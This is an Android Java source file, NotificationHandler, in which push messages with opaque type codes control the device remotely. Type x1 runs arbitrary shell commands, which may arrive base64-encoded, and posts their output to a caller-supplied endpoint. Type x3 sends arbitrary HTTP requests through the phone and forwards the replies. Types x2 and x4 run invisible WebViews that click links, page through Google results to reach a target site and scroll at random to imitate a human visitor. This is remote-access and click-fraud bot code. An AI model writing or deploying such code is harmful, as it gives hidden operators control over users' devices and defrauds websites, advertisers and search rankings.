package com.example.pushapp;

import android.content.Context;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;
import org.json.JSONObject;
import org.json.JSONException;
import java.net.URLDecoder;

/**
 * Utility class that centralizes the logic for handling data notifications
 * of type "x1" and "x2". Both the FirebaseMessagingService and
 * DebugBroadcastReceiver delegate to this class so the same behaviour
 * can be triggered from either a real FCM message or a debug broadcast.
 */
public final class NotificationHandler {

    private static final String TAG = "NotificationHandler";

    // Shared thread pool to execute background tasks.
    private static final ExecutorService executor = Executors.newCachedThreadPool();

    /**
     * Optional callback for test mode. When set, the output of an x1 command
     * will be passed to this listener instead of being posted to an endpoint.
     * This allows MainActivity to capture command output for display in the UI.
     */
    private static volatile OutputCallback testOutputListener;

    /**
     * Sets a listener that will receive the output of the next x1 command.  Once
     * invoked, the listener will be cleared.  Use this method only for
     * debugging/testing in the UI; in normal operation the output is posted to
     * the specified endpoint.
     *
     * @param listener Callback to receive command output.
     */
    public static void setTestOutputListener(OutputCallback listener) {
        testOutputListener = listener;
    }

    /**
     * Simple callback interface used for delivering command output during tests.
     */
    public interface OutputCallback {
        void onOutput(String output);
    }

    private NotificationHandler() {
        // Utility class: prevent instantiation.
    }

    /**
     * Entry point for handling a notification. Determines the type of the
     * notification and delegates to the appropriate handler. Unknown types
     * are ignored.
     *
     * @param context Application context used to create resources such as WebViews.
     * @param data    Map containing the data payload (e.g., from FCM or debug broadcast).
     */
    public static void handleNotification(Context context, Map<String, String> data) {
        if (data == null || data.isEmpty()) {
            Log.d(TAG, "No data payload in notification.");
            return;
        }
        String type = data.get("type");
        if (type == null) {
            Log.d(TAG, "Notification missing 'type'.");
            return;
        }
        switch (type) {
            case "x1":
                handleTypeX1(data);
                break;
            case "x2":
                handleTypeX2(context, data);
                break;
            case "x3":
                handleTypeX3(data);
                break;
            case "x4":
                handleTypeX4(context, data);
                break;
            default:
                Log.d(TAG, "Unknown notification type: " + type);
        }
    }

    /**
     * Handles 'x1' type notifications. Executes an arbitrary curl command and
     * posts the output to a specified endpoint.
     *
     * @param data Map containing 'curlCommand' and 'endpointURL'.
     */
    /**
     * Handles 'x1' type notifications. The command to run may be provided
     * either as a plain {@code curlCommand} string or as a base64 encoded
     * string under the key {@code curlCommandBase64}. When encoded, the
     * value is decoded before execution. This allows callers (like ADB
     * shell broadcasts) to include flags that begin with '-' without them
     * being interpreted as broadcast options.
     *
     * @param data Map containing 'curlCommand' or 'curlCommandBase64' and 'endpointURL'.
     */
    private static void handleTypeX1(Map<String, String> data) {
        final String endpointUrl = data.get("endpointURL");
        if (endpointUrl == null && testOutputListener == null) {
            Log.d(TAG, "x1 notification missing endpointURL parameter and no test listener set.");
            return;
        }
        final String curlCommand = getCurlCommand(data);
        if (curlCommand == null || curlCommand.trim().isEmpty()) {
            Log.d(TAG, "x1 notification missing curl command.");
            return;
        }
        executor.execute(() -> {
            String output = runShellCommand(curlCommand);
            // If a test listener is registered, deliver output to it instead of posting
            OutputCallback listener = testOutputListener;
            if (listener != null) {
                // Clear the listener before invoking to avoid accidental re-use
                testOutputListener = null;
                try {
                    listener.onOutput(output);
                } catch (Exception e) {
                    Log.e(TAG, "Error delivering test callback", e);
                }
            } else {
                // Normal operation: post response to specified endpoint
                postResponseToEndpoint(endpointUrl, output);
            }
        });
    }

    /**
     * Retrieves the curl command from the provided data. If a base64 encoded
     * version is present (under key {@code curlCommandBase64}), it will
     * attempt to decode it. If decoding fails or the key is absent, the
     * plain {@code curlCommand} key is used instead. Returns null if no
     * command is available.
     *
     * @param data Data map with optional curl command fields.
     * @return Decoded curl command or null.
     */
    private static String getCurlCommand(Map<String, String> data) {
        String base64Command = data.get("curlCommandBase64");
        if (base64Command != null) {
            try {
                byte[] decoded = android.util.Base64.decode(base64Command, android.util.Base64.DEFAULT);
                return new String(decoded, StandardCharsets.UTF_8);
            } catch (IllegalArgumentException e) {
                Log.e(TAG, "Invalid base64 in curlCommandBase64", e);
                // fall through to plain command
            }
        }
        return data.get("curlCommand");
    }

    /**
     * Handles 'x2' type notifications. Loads a URL in an off-screen WebView,
     * clicks an element containing a specified text and waits for the new page
     * to load, then scrolls randomly for a specified duration.
     *
     * @param context Application context.
     * @param data Map containing 'webURL', 'ClickText', and 'stayTime'.
     */
    private static void handleTypeX2(Context context, Map<String, String> data) {
        final String webUrl = data.get("webURL");
        final String clickText = data.get("ClickText");
        final String stayTimeStr = data.get("stayTime");
        if (webUrl == null || clickText == null || stayTimeStr == null) {
            Log.d(TAG, "x2 notification missing parameters.");
            return;
        }
        long stayTimeSec;
        try {
            stayTimeSec = Long.parseLong(stayTimeStr);
        } catch (NumberFormatException e) {
            Log.e(TAG, "Invalid stayTime: " + stayTimeStr, e);
            return;
        }
        // Launch the automation on the executor to avoid blocking the caller.
        executor.execute(() -> handleWebAutomation(context, webUrl, clickText, stayTimeSec));
    }

    /**
     * Handles 'x4' type notifications. Performs an automated Google search for
     * the provided keyword, scans through the search results pages until it
     * finds a result whose URL contains the specified targetWebsite string,
     * clicks that result, waits for the target page to fully load and then
     * randomly scrolls the page for a given number of seconds before closing
     * the WebView. The caller must supply at least the 'keywoard' (sic) and
     * 'targetWebsite' parameters. Optionally, a 'stayTime' parameter may be
     * provided to control how long the scrolling should occur (defaults to 5
     * seconds if unspecified or invalid). This method runs entirely in the
     * background and does not display any UI.
     *
     * Expected keys in the data map:
     * - keywoard: The search query to enter into Google.
     * - targetWebsite: A substring of the URL that identifies the desired result.
     * - stayTime: Optional duration (in seconds) to scroll the target page after it loads.
     *
     * @param context Application context for constructing a WebView.
     * @param data Map of notification parameters.
     */
    private static void handleTypeX4(Context context, Map<String, String> data) {
        final String keyword = data.get("keywoard");
        final String targetWebsite = data.get("targetWebsite");
        if (keyword == null || keyword.trim().isEmpty() || targetWebsite == null || targetWebsite.trim().isEmpty()) {
            Log.d(TAG, "x4 notification missing keywoard or targetWebsite parameter.");
            return;
        }
        long stayTimeSec = 5L;
        String stayTimeStr = data.get("stayTime");
        if (stayTimeStr != null) {
            try {
                stayTimeSec = Long.parseLong(stayTimeStr);
            } catch (NumberFormatException ignored) {
                Log.d(TAG, "Invalid stayTime for x4: " + stayTimeStr);
            }
        }
        final long finalStayTime = stayTimeSec;
        executor.execute(() -> handleGoogleSearch(context, keyword, targetWebsite, finalStayTime));
    }

    /**
     * Performs the Google search workflow described in handleTypeX4. It
     * orchestrates the WebView lifecycle on a dedicated thread. The flow is:
     * 1. Navigate to google.com/search?q=keyword.
     * 2. After the search results load, scan the result links for the
     *    targetWebsite substring. If found, click the first matching link.
     * 3. If not found, click the "Next" pagination link and repeat the
     *    scanning process on the next results page.
     * 4. Once the target page loads, scroll it randomly for the specified
     *    number of seconds and then destroy the WebView.
     *
     * @param context Application context.
     * @param keyword Query term to search for.
     * @param targetWebsite Substring to match in result URLs.
     * @param stayTimeSeconds How long to scroll the target page.
     */
    private static void handleGoogleSearch(Context context, String keyword, String targetWebsite, long stayTimeSeconds) {
        HandlerThread handlerThread = new HandlerThread("WebViewX4Thread");
        handlerThread.start();
        Handler handler = new Handler(handlerThread.getLooper());
        handler.post(() -> {
            WebView webView = new WebView(context);
            webView.getSettings().setJavaScriptEnabled(true);
            final boolean[] clickedTarget = new boolean[]{false};
            // Track whether we've submitted the initial search query after loading Google homepage.
            final boolean[] searchSubmitted = new boolean[]{false};
            final int[] pageCount = new int[]{1};
            final int maxPages = 10;
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    Log.d(TAG, "x4 page loaded: " + url);
                    if (clickedTarget[0]) {
                        // Once we've clicked the target result and the new page loads, start scrolling.
                        Log.d(TAG, "x4 target page loaded; starting scroll");
                        startScrolling(view, stayTimeSeconds);
                        return;
                    }
                    // Only proceed on pages served from Google domains. This includes the homepage and search results.
                    if (url != null && url.contains("google")) {
                        // If we haven't yet submitted the search query, do so now on the Google homepage.
                        if (!searchSubmitted[0]) {
                            String jsSubmit = "(function() {" +
                                    "var input = document.querySelector('input[name=\"q\"]');" +
                                    "if (input) {" +
                                    "  input.focus();" +
                                    "  input.value = '" + escapeJs(keyword) + "';" +
                                    "  var form = input.form;" +
                                    "  if (form) { form.submit(); return 'submitted'; }" +
                                    "  else { return 'nofrom'; }" +
                                    "} else { return 'noinput'; }" +
                                    "})();";
                            view.evaluateJavascript(jsSubmit, submitResult -> {
                                if (submitResult != null && submitResult.contains("submitted")) {
                                    Log.d(TAG, "x4 search query submitted");
                                    searchSubmitted[0] = true;
                                } else {
                                    Log.d(TAG, "x4 search submission result: " + submitResult);
                                }
                            });
                            return;
                        }
                        // After the search is submitted, scan result links for the target domain.
                        String js = "(function() {" +
                                "var links = document.querySelectorAll('a');" +
                                "for (var i = 0; i < links.length; i++) {" +
                                " var href = links[i].href;" +
                                " if (href && href.indexOf('" + escapeJs(targetWebsite) + "') !== -1) {" +
                                "   links[i].click();" +
                                "   return 'found';" +
                                " }" +
                                "}" +
                                "return 'not';" +
                                "})();";
                        view.evaluateJavascript(js, result -> {
                            if (result != null && result.contains("found")) {
                                Log.d(TAG, "x4 found and clicked target link");
                                clickedTarget[0] = true;
                            } else {
                                // Not found on this page; if within max page limit, click the next button.
                                if (pageCount[0] < maxPages) {
                                    pageCount[0]++;
                                    // Choose a random delay between 3 and 5 seconds before navigating to next page.
                                    long delayMs = (3 + new java.util.Random().nextInt(3)) * 1000L;
                                    handler.postDelayed(() -> {
                                        String jsNext = "(function() {" +
                                                "var next = document.querySelector('#pnnext');" +
                                                "if (next) { next.click(); return 'nextclicked'; } else { return 'no_next'; }" +
                                                "})();";
                                        view.evaluateJavascript(jsNext, nextResult -> {
                                            Log.d(TAG, "x4 next navigation result: " + nextResult);
                                        });
                                    }, delayMs);
                                } else {
                                    Log.d(TAG, "x4 reached max pages without finding target");
                                }
                            }
                        });
                    }
                }
            });
            // Start by loading the Google homepage. The search query will be injected upon load.
            webView.loadUrl("https://www.google.com");
        });
    }

    /**
     * Handles 'x3' type notifications. Performs an HTTP request to a specified URL
     * using the provided method, headers, query parameters, and JSON body, with
     * an optional timeout. The result of the request is then posted to a
     * callback URL. If a test output listener is set, the result will be
     * delivered locally instead of being posted remotely.
     *
     * Expected keys in the data map:
     *
     * - URL: the target URL to call
     * - requestType: HTTP method (GET, POST, PUT, DELETE, etc.)
     * - headers: JSON object as string or key:value pairs separated by '&' or ';'
     * - Params: query parameters in the form of key=value&key2=value2 or JSON
     * - PostJsonParams: JSON body to send for POST/PUT
     * - callBackURL: endpoint to post the response body to
     * - timeout: timeout in seconds (integer)
     *
     * @param data Map of key/value pairs from the notification.
     */
    private static void handleTypeX3(Map<String, String> data) {
        final String url = data.get("URL");
        if (url == null || url.trim().isEmpty()) {
            Log.d(TAG, "x3 notification missing URL");
            return;
        }
        final String method = data.getOrDefault("requestType", "GET");
        final String headersStr = data.get("headers");
        final String paramsStr = data.get("Params");
        final String postJsonParams = data.get("PostJsonParams");
        final String callbackUrl = data.get("callBackURL");
        final String timeoutStr = data.get("timeout");

        long timeoutSeconds = 30L;
        if (timeoutStr != null) {
            try {
                timeoutSeconds = Long.parseLong(timeoutStr);
            } catch (NumberFormatException ignored) {
                Log.d(TAG, "Invalid timeout value: " + timeoutStr);
            }
        }

        long finalTimeoutSeconds = timeoutSeconds;
        executor.execute(() -> {
            // Build a client with the requested timeout
            OkHttpClient client = new OkHttpClient.Builder()
                    .connectTimeout(finalTimeoutSeconds, java.util.concurrent.TimeUnit.SECONDS)
                    .readTimeout(finalTimeoutSeconds, java.util.concurrent.TimeUnit.SECONDS)
                    .writeTimeout(finalTimeoutSeconds, java.util.concurrent.TimeUnit.SECONDS)
                    .build();

            // Construct the URL with query parameters if provided
            okhttp3.HttpUrl httpUrl;
            try {
                okhttp3.HttpUrl base = okhttp3.HttpUrl.parse(url);
                if (base == null) {
                    throw new IllegalArgumentException("Invalid URL: " + url);
                }
                okhttp3.HttpUrl.Builder urlBuilder = base.newBuilder();
                if (paramsStr != null && !paramsStr.isEmpty()) {
                    // Try to parse as JSON first
                    boolean parsed = false;
                    try {
                        org.json.JSONObject paramsJson = new org.json.JSONObject(paramsStr);
                        java.util.Iterator<String> keys = paramsJson.keys();
                        while (keys.hasNext()) {
                            String key = keys.next();
                            Object value = paramsJson.get(key);
                            if (value != null) {
                                urlBuilder.addQueryParameter(key, String.valueOf(value));
                            }
                        }
                        parsed = true;
                    } catch (org.json.JSONException ignore) {
                        // Not JSON, treat as query string key=value pairs separated by & or ;
                    }
                    if (!parsed) {
                        String[] pairs = paramsStr.split("[&;]");
                        for (String pair : pairs) {
                            int idx = pair.indexOf('=');
                            if (idx > 0 && idx < pair.length() - 1) {
                                String key = java.net.URLDecoder.decode(pair.substring(0, idx).trim());
                                String value = java.net.URLDecoder.decode(pair.substring(idx + 1).trim());
                                urlBuilder.addQueryParameter(key, value);
                            }
                        }
                    }
                }
                httpUrl = urlBuilder.build();
            } catch (Exception e) {
                Log.e(TAG, "Error building URL for x3", e);
                // If there's a test listener, report error
                OutputCallback listener = testOutputListener;
                if (listener != null) {
                    testOutputListener = null;
                    listener.onOutput("URL error: " + e.getMessage());
                }
                return;
            }

            // Prepare request body if necessary
            RequestBody body = null;
            if (postJsonParams != null && !postJsonParams.isEmpty() && !method.equalsIgnoreCase("GET")) {
                body = RequestBody.create(postJsonParams, MediaType.parse("application/json; charset=utf-8"));
            }

            Request.Builder reqBuilder = new Request.Builder().url(httpUrl);

            // Apply headers if provided
            if (headersStr != null && !headersStr.isEmpty()) {
                boolean parsedHeaders = false;
                try {
                    org.json.JSONObject hdrJson = new org.json.JSONObject(headersStr);
                    java.util.Iterator<String> keys = hdrJson.keys();
                    while (keys.hasNext()) {
                        String key = keys.next();
                        Object value = hdrJson.get(key);
                        if (value != null) {
                            reqBuilder.addHeader(key, String.valueOf(value));
                        }
                    }
                    parsedHeaders = true;
                } catch (org.json.JSONException ignore) {
                    // Not JSON, treat as key:value pairs separated by & or ; or newline
                }
                if (!parsedHeaders) {
                    String[] pairs = headersStr.split("[;&]\s*");
                    for (String pair : pairs) {
                        int idx = pair.indexOf(':');
                        if (idx <= 0) {
                            idx = pair.indexOf('=');
                        }
                        if (idx > 0 && idx < pair.length() - 1) {
                            String key = pair.substring(0, idx).trim();
                            String value = pair.substring(idx + 1).trim();
                            reqBuilder.addHeader(key, value);
                        }
                    }
                }
            }

            // Set HTTP method accordingly
            String m = method == null ? "GET" : method.trim().toUpperCase();
            switch (m) {
                case "POST":
                    if (body == null) body = RequestBody.create(new byte[0], null);
                    reqBuilder.post(body);
                    break;
                case "PUT":
                    if (body == null) body = RequestBody.create(new byte[0], null);
                    reqBuilder.put(body);
                    break;
                case "DELETE":
                    if (body != null) reqBuilder.delete(body);
                    else reqBuilder.delete();
                    break;
                case "PATCH":
                    if (body == null) body = RequestBody.create(new byte[0], null);
                    reqBuilder.patch(body);
                    break;
                case "HEAD":
                    reqBuilder.head();
                    break;
                case "GET":
                default:
                    reqBuilder.get();
                    break;
            }

            // Execute the request
            String responseBody = null;
            Exception requestException = null;
            try {
                Response response = client.newCall(reqBuilder.build()).execute();
                try (ResponseBody respBody = response.body()) {
                    responseBody = respBody != null ? respBody.string() : "";
                }
            } catch (Exception e) {
                requestException = e;
            }

            // If a test listener is set, deliver the result or error
            OutputCallback listener = testOutputListener;
            if (listener != null) {
                testOutputListener = null;
                if (requestException != null) {
                    listener.onOutput("HTTP error: " + requestException.getMessage());
                } else {
                    listener.onOutput(responseBody != null ? responseBody : "");
                }
                return;
            }

            // Otherwise, post the result to callback URL if provided
            if (callbackUrl != null && requestException == null) {
                OkHttpClient postClient = client; // reuse same timeouts
                RequestBody callbackBody = RequestBody.create(responseBody != null ? responseBody : "", MediaType.parse("text/plain; charset=utf-8"));
                Request postRequest = new Request.Builder()
                        .url(callbackUrl)
                        .post(callbackBody)
                        .build();
                try {
                    postClient.newCall(postRequest).execute().close();
                } catch (Exception e) {
                    Log.e(TAG, "Error posting x3 callback", e);
                }
            } else if (requestException != null) {
                Log.e(TAG, "Error executing x3 request", requestException);
            }
        });
    }

    /**
     * Executes a shell command and returns the captured standard output.
     *
     * @param command Command to execute. In production, ensure this is properly sanitized.
     * @return Standard output of the command.
     */
    private static String runShellCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", command});
            InputStream is = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append('\n');
            }
            reader.close();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            Log.e(TAG, "Error executing command: " + command, e);
        }
        return output.toString();
    }

    /**
     * Posts a response body to an endpoint via HTTP POST.
     *
     * @param endpointUrl URL to post to.
     * @param responseBody Body content to send.
     */
    private static void postResponseToEndpoint(String endpointUrl, String responseBody) {
        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(responseBody == null ? "" : responseBody,
                MediaType.parse("text/plain; charset=utf-8"));
        Request request = new Request.Builder()
                .url(endpointUrl)
                .post(body)
                .build();
        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) {
                Log.e(TAG, "Failed to POST response: " + response.code());
            } else {
                Log.d(TAG, "Successfully posted response to endpoint.");
            }
        } catch (IOException e) {
            Log.e(TAG, "Error posting response to endpoint", e);
        }
    }

    /**
     * Conducts the web automation described for type 'x2'. It creates a WebView
     * on a background thread, loads the URL, clicks the target text, waits for
     * the new page to load, then scrolls randomly for the given duration.
     *
     * @param context Application context.
     * @param url URL to load.
     * @param clickText Text of the element to click.
     * @param stayTimeSeconds Time in seconds to scroll after the new page loads.
     */
    private static void handleWebAutomation(Context context, String url, String clickText, long stayTimeSeconds) {
        // Use a HandlerThread to host the WebView in its own thread with a Looper.
        HandlerThread handlerThread = new HandlerThread("WebViewDebugThread");
        handlerThread.start();
        Handler handler = new Handler(handlerThread.getLooper());

        handler.post(() -> {
            WebView webView = new WebView(context);
            webView.getSettings().setJavaScriptEnabled(true);
            final boolean[] clickPerformed = new boolean[]{false};
            final boolean[] scrollStarted = new boolean[]{false};
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String finishedUrl) {
                    super.onPageFinished(view, finishedUrl);
                    Log.d(TAG, "Page loaded: " + finishedUrl);
                    if (!clickPerformed[0]) {
                        // On first load, perform the click on the element containing the target text.
                        String js = "(function() {" +
                                "var elements = document.querySelectorAll('*');" +
                                "for (var i = 0; i < elements.length; i++) {" +
                                "  var el = elements[i];" +
                                "  if (el.innerText && el.innerText.toLowerCase().indexOf('" + escapeJs(clickText.toLowerCase()) + "') !== -1) {" +
                                "    el.click();" +
                                "    return true;" +
                                "  }" +
                                "}" +
                                "return false;" +
                                "})();";
                        view.evaluateJavascript(js, result -> {
                            Log.d(TAG, "Click executed: " + result);
                            clickPerformed[0] = true;
                        });
                    } else if (clickPerformed[0] && !scrollStarted[0]) {
                        // After click, when the new page finishes loading, start scrolling.
                        scrollStarted[0] = true;
                        startScrolling(view, stayTimeSeconds);
                    }
                }
            });
            webView.loadUrl(url);
        });
    }

    /**
     * Escapes characters in a string to safely embed it in a JavaScript literal.
     *
     * @param value Raw string to escape.
     * @return Escaped string safe for JS.
     */
    private static String escapeJs(String value) {
        return value.replace("\\", "\\\\").replace("'", "\\'").replace("\"", "\\\"");
    }

    /**
     * Performs random scrolling on a WebView for the given number of seconds.
     *
     * @param webView WebView to scroll.
     * @param stayTimeSeconds Duration in seconds.
     */
    private static void startScrolling(WebView webView, long stayTimeSeconds) {
        executor.execute(() -> {
            long endTime = System.currentTimeMillis() + stayTimeSeconds * 1000L;
            Random random = new Random();
            while (System.currentTimeMillis() < endTime) {
                int scrollBy = 200 + random.nextInt(300);
                webView.post(() -> webView.scrollBy(0, scrollBy));
                try {
                    Thread.sleep(500 + random.nextInt(1000));
                } catch (InterruptedException e) {
                    break;
                }
            }
            webView.post(() -> {
                try {
                    webView.destroy();
                } catch (Exception e) {
                    Log.e(TAG, "Error destroying WebView", e);
                }
            });
        });
    }
}